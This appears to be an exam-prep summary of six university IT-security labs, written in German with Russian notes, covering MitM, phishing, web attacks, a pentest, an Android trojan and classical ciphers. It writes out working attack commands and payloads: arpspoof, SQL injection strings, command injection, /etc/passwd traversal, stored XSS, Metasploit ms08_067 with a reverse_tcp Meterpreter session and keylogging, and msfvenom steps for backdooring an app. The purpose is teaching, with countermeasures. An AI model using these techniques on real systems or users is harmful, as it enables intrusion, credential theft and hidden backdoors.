# Praktika 01–06 — Zusammenfassung
**Quelle: Praktikumsanleitungen (Schildbach)** · Ergänzt die Theoriekapitel

> **О чём файл.** Краткая, но полная выжимка всех шести лаб: что делали, какими инструментами, какие команды, и — главное для экзамена — **какой теоретический концепт за этим стоит и какое Schutzziel затронуто**. Экзамен может дать практический вопрос («какой инструмент для X», «что делает эта команда», «почему `' OR 1=1 --` логинит без пароля»).
>
> **Среда (из Praktikum 01):** всё в **VirtualBox**, общий **NAT-Netzwerk „eits" = 192.168.42.0/24**, DHCP. VMs: **ForDeb** (атакующий/анализ, Kali-подобная), WebSecurityLab/OWASP, WinXP, GSM (Greenbone), Android. ⚠️ Всё только в изолированной лаборатории, легально, с разрешения.
>
> **Обозначения:** ⭐ вероятно на экзамене · 🔧 команда/инструмент · ⚠️ ловушка · 🔗 связь с главой.

## Обзор — какой практикум к какой теме
| Praktikum | Тема | Теория | Schutzziel |
|---|---|---|---|
| **01** Virtualisierung | Sandboxing, VirtualBox, NAT, Subnetting | [02 Rechnernetze](02_Rechnernetze.md) | — (Testumgebung) |
| **02** MitM + Phishing | ARP-Spoofing, Social Engineering (SET) | [03 → 3.3.3, 3.4.5](03_Angriffe.md) | Vertraulichkeit, Authentizität |
| **03** Websicherheit + Darkweb | SQLi, Command/Directory, XSS, SQLMap, Nikto, TOR | [03 → 3.4](03_Angriffe.md), [04 TOR](04_Anonymitaet_TOR.md) | Vertraulichkeit, Integrität |
| **04** Pentest | nmap → OpenVAS → Metasploit → Meterpreter | [03 → 3.5](03_Angriffe.md) | alle (Übernahme) |
| **05** Android | Trojaner/Backdoor in App (msfvenom, smali) | [05 Malware](05_Malware.md), [03 → 3.5.2](03_Angriffe.md) | alle |
| **06** CrypTool | Caesar, Vigenère, Playfair (klassische Chiffren) | [06 Kryptografie](06_Kryptografie.md) | Vertraulichkeit |

---

## Praktikum 01 — Grundlagen der Virtualisierung (Sandboxing) ⭐

**Ziel:** sichere **Testumgebung** aufbauen — gefährliche Software „gefahrlos ausprobieren" ohne den echten Rechner zu beschädigen. Fachbegriff: **Sandboxing**.

- **Virtualisierung:** mehrere **Gast-Systeme (VMs)** parallel auf einem **Host** → simuliert ein kleines Netz. Software: **VirtualBox** (Oracle, quelloffen, kostenlos, Windows/Linux). Alternativen: QEMU/UTM, VMware.
- **VM-Formate:** fertige **Appliances** (`.ova`/`.ovf`) oder lose Rohdateien (`.vbox`, `.vdi`, `.vmdk`). **Verknüpfter Klon** (nur Änderungen gespeichert, spart Platz) vs. vollständiger Klon.
- ⚠️ **Sicherheitshinweis:** die bereitgestellten VMs enthalten **absichtlich gravierende Sicherheitslücken** → niemals damit im echten Internet surfen.

**Netzwerkmodi in VirtualBox ⭐ (Zuordnung möglich):**
| Modus | Gast↔Gast | Gast→Host | Host→Gast | Gast→Extern | Kerncharakter |
|---|---|---|---|---|---|
| **NAT** (einzeln) | nein | nein | nur per Portweiterleitung | ja | jede VM hinter eigenem NAT |
| **NAT-Netzwerk** ⭐ | **ja** | **nein** (Host geschützt) | nur per Portweiterleitung | **ja** | im Praktikum verwendet |
| Netzwerkbrücke (Bridged) | ja | ja | ja | ja | VM direkt im echten LAN |
| Internes Netzwerk | ja | nein | nein | nein | komplett isoliert |
| Host-only | ja | ja | ja | nein | nur Host + Gäste |

→ Gewählt: **NAT-Netzwerk „eits"** — Gäste reden untereinander, Host bleibt geschützt (kein Gast→Host), Internetzugang möglich. DHCP vergibt Adressen aus **192.168.42.0/24**.

**Subnetting-Wiederholung (Praktikum rechnet es vor) 🧮** (🔗 [02 → 2.6.3](02_Rechnernetze.md)):
```
192.168.42.0/24  → Maske 255.255.255.0
Netzadresse:    192.168.42.0    (Hostteil alles 0)
Broadcast:      192.168.42.255  (Hostteil alles 1)
max. Geräte:    2^8 − 2 = 254
```

---

## Praktikum 02 — Man-in-the-Middle + Phishing ⭐
*(ausführlich in [03 → 3.3.3 und 3.4.5](03_Angriffe.md) — hier Kurzfassung)*

**Teil 1 — MitM per ARP-Spoofing** (3 VMs: Client-Opfer, WebSecurityLab-Server, Angreifer):
1. 🔧 `echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward` — **IP-Forwarding** an (Pakete weiterleiten, damit das Opfer nichts merkt).
2. 🔧 `sudo ip link set enp0s3 promisc on` — **promiscuous mode**.
3. 🔧 `sudo arpspoof -i enp0s3 -r -t ClientIP ServerIP` — `-r` beidseitig, `-t` Target.
4. Analyse: **urlsnarf** (URLs), **driftnet** (Bilder), **Wireshark** (`-k`).
- 🔧 **Erkennung:** `ip neighbour show` / `ip n` → **zwei IPs mit gleicher MAC** = Spoofing-Indiz; Wireshark-Expertinfo „duplicate use … detected".
- **Schutzziele:** Vertraulichkeit (Mitlesen) stark betroffen; Integrität/Verfügbarkeit nur, wenn der Angreifer Pakete verändert/verwirft.
- ⚠️ Nur **unverschlüsselter** Verkehr lesbar; HTTPS schützt den Inhalt.

**Teil 2 — Phishing mit SET (Social Engineering Toolkit):**
- 🔧 `sudo setoolkit` → *Social-Engineering Attacks → Website Attack Vectors → **Credential Harvester** → Web Templates (Google)*.
- Klont die Google-Login-Seite, sammelt eingegebene (Test-)Daten → Report in `/root/.set/reports/`.
- **Domain-Aufbau verstehen** (wichtig gegen Phishing): Besitzer = **Domain + TLD** (`google.de`); Subdomain/Pfad/Parameter nur Zusätze. Tricks: `goog1e.de`, `google.sicherer-login.de` (echte Domain = sicherer-login.de).
- **Erweiterung:** mit **DNS-Spoofing** zeigt die Adresszeile sogar die echte Domain → noch glaubwürdiger.

---

## Praktikum 03 — Websicherheit + Dark Web ⭐⭐

### Teil 1 — Websicherheit (OWASP-BWA = Broken Web Applications)
Trainingsserver mit absichtlichen Lücken; Angriffsziel aus ForDeb-VM. Kennen: **OWASP Top 10**.

**1.1 SQL-Injection (Mutillidae II) ⭐⭐ — der wichtigste Praktikums-Fakt:**
- Eingabe `'` (Hochkomma) im Nutzernamen → **Fehlermeldung verrät die SQL-Abfrage**: `SELECT username FROM accounts WHERE username='?' …`
- Eingabe **`' OR 1=1 -- -`** als Nutzername → Abfrage wird zu
  `SELECT username FROM accounts WHERE username='' OR 1=1; -- -' …`
  → **`1=1` ist immer wahr (Tautologie)**, `-- -` kommentiert den Rest (inkl. Passwortprüfung) aus → **Login als `admin` ohne Passwort**.
- **Warum es klappt:** Nutzereingabe wird **ungeprüft** in den Query-String eingesetzt → Eingabe wird als **SQL-Code** statt als Daten interpretiert.
- **Gegenmaßnahme:** **Prepared Statements**, Eingabevalidierung, Encodings (🔗 [03 → 3.4.3](03_Angriffe.md)).

**1.2 Command Injection (DNS-Lookup-Tool):**
- Server ruft intern `nslookup <Eingabe>` auf, Eingabe **ungeprüft** → `localhost && ls -la` führt **beliebiges OS-Kommando** aus (Befehlsverkettung mit `&&`).

**1.3 Directory Traversal / unsichere Objektreferenz:**
- URL `…/index.php?page=dns-lookup.php` → Parameter `page` ungeprüft → `…?page=/etc/passwd` zeigt **Systemdatei**; `…/mutillidae/images` listet Verzeichnis (Directory Listing).
- Ursachen: fehlende Parameterprüfung + **zu weite Rechte des Webservers**.

**1.4 Stored XSS (DVWA, Gästebuch) ⭐:**
- Nachricht `Test <script>alert("Hallo");</script>` → bei **jedem** Seitenaufruf aller Nutzer ausgeführt (**stored/persistent XSS**).
- Längenlimit `maxlength="50"` ist nur **im Browser** gesetzt → über Entwickler-Werkzeuge entfernbar → größere Skripte (Links umbiegen, Überschrift ändern, bis Session-Diebstahl).
- Ursache: **ungeprüfte Eingaben** + nur clientseitige Prüfung. Gegenmaßnahme: Output-Encoding, serverseitige Validierung (🔗 [03 → 3.4.4](03_Angriffe.md)).

**1.5 SQLMap (OWASP Bricks):** 🔧 automatisiertes SQLi-Tool.
- `sqlmap -u <URL>` → erkennt DBMS; `--dbs` listet Datenbanken; Zugriff auf DB `bricks` → Tabelle `users` mit Passwörtern. Einige im **Klartext** (sehr schlecht!), eines als **MD5-Hash** `5f4dcc3b5aa765d61d8327deb882cf99` — per **Wörterbuchangriff** sofort geknackt = **„password"** (🔗 MD5 unsicher, [06 → 6.6](06_Kryptografie.md)).

**1.6 Nikto:** 🔧 kompakter Webserver-Schwachstellenscanner.
- `nikto -host http://<URL> -C all -output nikto.txt` → findet veraltete Komponenten, bekannte Lücken mit **CVE/OSVDB**-Kennung, Directory Listing, XSS. Kann IDS umgehen. ⚠️ Zu häufige Scans → IP als „Bot" markiert.

### Teil 2 — Dark Web (TOR-Browser) ⭐ (🔗 [04 TOR](04_Anonymitaet_TOR.md))
- **TOR-Browser** = modifizierter Firefox; nutzt **Onion-Routing**, dynamische Route über weltweit verteilte Knoten → trennt **Identität (IP)** von **Inhalt (Datenpakete)**.
- **Nachteile (Praktikum):** Überwachung vieler Knoten kann Kommunikation aufdecken; kein Schutz, wenn jemand **ersten und letzten** Knoten kontrolliert; langsam.
- **Eigene Verantwortung:** nur TOR reicht nicht — englische Version nutzen, Fenstergröße/**Letterboxing** nicht ändern (sonst Browser-Fingerprinting).

**Terminologie ⭐⭐ (klassische Zuordnungsfrage):**
| Begriff | Bedeutung |
|---|---|
| **Internet** | infrastrukturelle Grundlage (Hardware + Protokolle) |
| **Darknet** | mit Zusatz-Hardware/Protokollen realisiertes Netz **auf** dem Internet (TOR ist **ein** Darknet von vielen) |
| **World Wide Web** | alle erreichbaren Inhalte des Internets |
| **Surface Web** (Clear/Visible Web) | **frei zugänglich, von Suchmaschinen indexiert** (z. B. Wikipedia) — kleinster Teil |
| **Deep Web** | **nicht** von Suchmaschinen indexiert, Zugang über Login/Passwort (Onlinebanking, E-Mail, privates Instagram) — **größter Teil** |
| **Dark Web** | Dienste/Seiten, erreichbar **nur über ein Darknet** + spezielle Software (TOR-Browser), `.onion` |

⚠️ **Unterscheiden:** **Darknet** = Infrastruktur (das Netz), **Dark Web** = Inhalte darauf. **Deep Web ≠ Dark Web** (Deep Web = alles nicht-indexierte inkl. Onlinebanking; Dark Web = kleiner, verborgener Teil davon).

---

## Praktikum 04 — Penetrationstest ⭐
*(ausführlich in [03 → 3.5](03_Angriffe.md) — hier die Kette)*

Ziel: veraltetes **WinXP** übernehmen. VMs: ForDeb (Angreifer), GSM (Scanner), WinXP (Opfer).
1. **Recon/Portscan** 🔧 `nmap`/**Zenmap**: `ip a` (eigenes Netz), Ping-Scan (Host Discovery), **Intense Scan `nmap -T4 -A -v <netz>/24`** (`-A` = OS- + Versions-Erkennung + Skript + Traceroute; braucht sudo). → WinXP mit **SMB auf Port 445**, Workgroup aus `smb-os-discovery`.
2. **Schwachstellenanalyse** 🔧 **Greenbone/OpenVAS** (GSA-Weboberfläche, selbstsigniertes Zertifikat zulassen, Login admin/admin, Aufgaben-Wizard, Ziel = WinXP). Findet kritische **SMB-Lücke (netapi)**.
3. **Exploit** 🔧 **Metasploit** (`msfconsole -q`): `search type:exploit platform:windows smb` → `use exploit/windows/smb/ms08_067_netapi`; `show options`/`show missing` → `set RHOST <WinXP>`, LHOST = ForDeb, RPORT 445, `set TARGET …`; Payload **`windows/meterpreter/reverse_tcp`**; `exploit`/`run`.
   - ⚠️ **MS06-040** verursacht auf XP SP2 nur **DoS (Absturz)**; der neuere **MS08-067** übernimmt → Wahl des richtigen Exploits entscheidend.
4. **Post-Exploitation (Loot)** 🔧 Meterpreter: `getuid`, `getsystem` (**Rechte-Eskalation**), `sysinfo`, `screenshot`, `ps`/`migrate PID` (nach `explorer.exe`), `keyscan_start/dump/stop`, `shell`, `shutdown -s -f -t 0`, `timestomp` (Spuren verwischen).
- **Exploit vs. Payload ⭐:** Exploit nutzt die Lücke/verschafft Zugriff; **Payload** ist der danach ausgeführte Schadcode (hier die Meterpreter-Session).

---

## Praktikum 05 — Android-Trojaner (Backdoor in App) ⭐

**Ziel:** eine **Hintertür (Backdoor)** in eine echte App einschleusen → **trojanisierte App** (🔗 [05 Malware → Trojaner/Backdoor](05_Malware.md)). VMs: ForDeb (Angreifer), Android 4.3 (Opfer).

> ⚠️ **Nicht wie Praktikum 04:** hier wird **keine Schwachstelle ausgenutzt**, sondern Schadcode in eine harmlose App (Spiel „2048") versteckt — klassischer **Trojaner** (Täuschung, Nutzer startet selbst).

**Ablauf (5 Schritte, Abb. 1):** *Payload erzeugen → Payload in App injizieren → App signieren → App ausliefern → Exploit.*
1. 🔧 **Payload erzeugen:** `msfvenom -o payload.apk -p android/meterpreter/reverse_tcp LHOST=<ForDebIP> LPORT=4334`
   - **reverse_tcp:** die App verbindet sich **vom Opfer zum Angreifer** → man muss die (veränderliche) IP des Smartphones nicht kennen. Gegenstück **bind_tcp** (öffnet Port auf dem Opfer, Angreifer verbindet sich hin — auch andere könnten das).
2. 🔧 **Dekompilieren:** `apktool d -f -o 2048 2048.apk` und `apktool d -f -o payload payload.apk`
   - APK → lesbare Bestandteile. Android-Apps werden in Java/Kotlin geschrieben → zu **Dalvik Executables (`.dex`)** kompiliert → mit apktool in **Smali** (eine Art **Assembler** für Android) umwandelbar. Smali ändern = Programmfluss ändern.
3. **Injizieren:** `smali`-Verzeichnis der Payload-App in die 2048-App kopieren → Code ist drin, läuft aber noch nicht.
4. **Hook:** im Einstiegspunkt der App (`<activity>` mit `MAIN`/`LAUNCHER` in **AndroidManifest.xml**) den Payload-Start **mit dem App-Start verknüpfen** (**Hooking**).
5. **Signieren + Ausliefern + Exploit:** App neu signieren, verteilen; beim Start der App baut sie die Reverse-Verbindung zum Angreifer auf → Meterpreter-Session.

**Kernbegriffe ⭐:** Backdoor, trojanisierte App, Dekompilieren, Smali/Dalvik/`.dex`, Hooking, Reverse- vs. Bind-Shell, APK signieren.

---

## Praktikum 06 — Kryptographische Verfahren (CrypTool 2) ⭐

**Ziel:** klassische Chiffren verstehen und brechen. **CrypTool 2** (Windows, .NET) — visuelle Programmierung (Komponenten per Drag&Drop verbinden: Texteingabe → Chiffre → Textausgabe; F5 = Start). 🔗 [06 Kryptografie](06_Kryptografie.md).

> Klassische Verfahren werden heute nicht mehr eingesetzt, aber ihre Techniken (**Substitution, Rotation, Transposition**) bilden die Basis moderner Chiffren.

### 1. Caesar-Chiffre — monoalphabetische Substitution ⭐🧮
- Jeder Buchstabe um **Schlüssel k** Stellen verschoben (z. B. k=3: A→D, B→E …).
- **Schlüsselraum:** = Alphabetlänge; bei A–Z nur **25 sinnvolle Schlüssel** (26. bildet A→A ab).
- **Kryptoanalyse (Ciphertext-Only):** (1) **Brute-Force** — alle 25 testen; (2) **Häufigkeitsanalyse** — da jeder Klartextbuchstabe **immer** auf denselben Geheimtextbuchstaben abgebildet wird, verrät die statistische Buchstabenverteilung die Verschiebung. CrypTool: *Frequency Test → Caesar-Analyse → Caesar (entschlüsseln)* — Sprache = Deutsch beachten!
- 🧮 **Beispiel-Lösung aus dem Praktikum** (Geheimtext `HLQHQULQJVLH…`, k=3) → *„EINEN RING SIE ZU KNECHTEN, SIE ALLE ZU FINDEN, INS DUNKEL ZU TREIBEN UND EWIG ZU BINDEN …"* (Herr der Ringe). ⭐ Gut als Rechenbeispiel: Entschlüsseln = jeden Buchstaben um k **zurück** schieben.

### 2. Vigenère-Chiffre — polyalphabetische Substitution ⭐
- Statt einer Zahl ein **Schlüsselwort** (z. B. `KEY`), das sich über den Klartext wiederholt. Jeder Klartextbuchstabe wird per **Caesar mit dem jeweiligen Schlüsselbuchstaben** verschoben.
  ```
  Klartext:   DAS IST EIN GEHEIMER TEXT
  Schlüssel:  KEY KEY KEY KEYKEYKE YKEY
  Geheimtext: NEQ SWR OML QIFOMKOV ROBR
  ```
- Da **wechselnde Alphabete** benutzt werden, wird ein Klartextbuchstabe **nicht** immer gleich chiffriert → **einfache Häufigkeitsanalyse scheitert**. Galt lange als unknackbar (bis ~1850).
- **Sicherheit hängt an der Schlüssellänge:** Schlüssel der Länge 1 = Caesar; je länger/zufälliger, desto sicherer (Grenzfall = One-Time-Pad, 🔗 [06 → 6.3](06_Kryptografie.md)).
- **Kryptoanalyse:** erst **Schlüssellänge** bestimmen (➕ Kasiski/Friedman), dann je Position eine Häufigkeitsanalyse. ⚠️ Im Praktikum scheitert die Analyse bei zu kurzem Text.

### 3. Playfair-Chiffre — bigraphische Substitution
- Verschlüsselt **Buchstabenpaare** (nicht einzelne Buchstaben) über eine **5×5-Schlüsselmatrix**.
- Matrix aus Schlüsselwort bilden: doppelte Buchstaben entfernen (`KRYPTOGRAPHIE` → `KRYPTOGAHIE`), Rest des Alphabets anhängen (I/J teilen sich ein Feld). Britisches Militär bis Ende 1. Weltkrieg.

**Einordnung der Verfahren ⭐ (Zuordnung):**
| Chiffre | Typ | Einheit | Schlüssel |
|---|---|---|---|
| **Caesar** | monoalphabetische Substitution | 1 Buchstabe | eine Verschiebezahl |
| **Vigenère** | polyalphabetische Substitution | 1 Buchstabe, wechselnde Alphabete | Schlüsselwort |
| **Playfair** | bigraphische Substitution | Buchstabenpaare | Schlüsselwort → 5×5-Matrix |

---

# Aufgaben — типичные [T] / перенос [N]
Решения сразу под задачей.

**A1 [T]. Warum verwendet das Praktikum ein NAT-Netzwerk und nicht „Netzwerkbrücke"?**
> **✅ Lösung:** Das **NAT-Netzwerk** erlaubt Kommunikation **Gast↔Gast** und **Gast→Internet**, verhindert aber **Gast→Host** → der echte Rechner (Host) bleibt vor den absichtlich verwundbaren VMs geschützt (Sandboxing). Eine **Netzwerkbrücke** würde die VMs direkt ins echte LAN hängen und Host/andere Rechner gefährden.

**A2 [T]. `' OR 1=1 -- -` als Nutzername loggt ohne Passwort ein. Erklären Sie warum.**
> **✅ Lösung:** Die Eingabe wird ungeprüft in `… WHERE username='$u' …` eingesetzt → `… WHERE username='' OR 1=1; -- -'`. `OR 1=1` ist **immer wahr** (Tautologie), `-- -` kommentiert den Rest der Abfrage (die Passwortprüfung) aus → die erste Zeile (admin) wird zurückgegeben. Ursache: fehlende Eingabeprüfung; Schutz: **Prepared Statements**.

**A3 [T]. Was ist der Unterschied zwischen Deep Web und Dark Web?**
> **✅ Lösung:** **Deep Web** = alle Inhalte, die **nicht von Suchmaschinen indexiert** sind und meist Login/Passwort brauchen (Onlinebanking, E-Mail) — der **größte** Teil des Netzes, ganz alltäglich. **Dark Web** = ein **kleiner**, verborgener Teil, erreichbar **nur über ein Darknet** (z. B. TOR) und spezielle Software (`.onion`). Zusatz: **Darknet** = die Infrastruktur, **Dark Web** = die Inhalte darauf.

**A4 [T]. Warum reverse_tcp statt bind_tcp beim Android-Payload?**
> **✅ Lösung:** Bei **reverse_tcp** verbindet sich das **Opfer zum Angreifer** → man muss die (veränderliche, oft hinter NAT liegende) IP des Smartphones nicht kennen, und Firewalls, die nur eingehende Verbindungen blocken, werden umgangen. Bei **bind_tcp** öffnet das Opfer einen Port — den könnten auch Dritte finden, und Firewalls blocken eingehende Verbindungen oft.

**A5 [T]. Caesar-Chiffre: Warum ist sie trivial zu brechen, Vigenère aber nicht mit einfacher Häufigkeitsanalyse?**
> **✅ Lösung:** Caesar ist **monoalphabetisch** — jeder Klartextbuchstabe wird **immer** gleich abgebildet, also verrät die Buchstabenhäufigkeit sofort die Verschiebung (oder man testet alle 25 Schlüssel per Brute-Force). Vigenère ist **polyalphabetisch** — durch das wiederholte Schlüsselwort wird derselbe Buchstabe je nach Position **unterschiedlich** chiffriert, was die Häufigkeitsverteilung verwischt. Man muss erst die **Schlüssellänge** bestimmen.

**A6 [N] 🧮. Entschlüsseln Sie den Caesar-Text `KHOOR` mit k=3.**
> **✅ Lösung:** Jeden Buchstaben um 3 **zurück**: K→H, H→E, O→L, O→L, R→O → **HELLO**.

**A7 [N]. Ordnen Sie Werkzeug → Zweck:** arpspoof · SET · sqlmap · nikto · nmap · msfvenom · apktool · CrypTool
> **✅ Lösung:** arpspoof → ARP-Spoofing/MitM · SET → Phishing (Seiten klonen, Credential Harvester) · sqlmap → automatisierte SQL-Injection · nikto → Webserver-Schwachstellenscan · nmap → Port-/Netzwerkscan + OS-Erkennung · msfvenom → Payload (Schadcode) erzeugen · apktool → APK dekompilieren (→ Smali) · CrypTool → klassische Chiffren lernen/brechen.

**A8 [T]. Welches Schutzziel verletzt die stored-XSS im Gästebuch, und warum reicht die `maxlength`-Prüfung nicht?**
> **✅ Lösung:** Primär **Integrität** der Seite (fremder Code verändert sie) und je nach Payload **Vertraulichkeit** (Session-/Nutzerdaten-Diebstahl). `maxlength="50"` ist nur **clientseitig** im HTML gesetzt und über die Browser-Entwicklerwerkzeuge entfernbar → es braucht **serverseitige** Validierung und **Output-Encoding**.
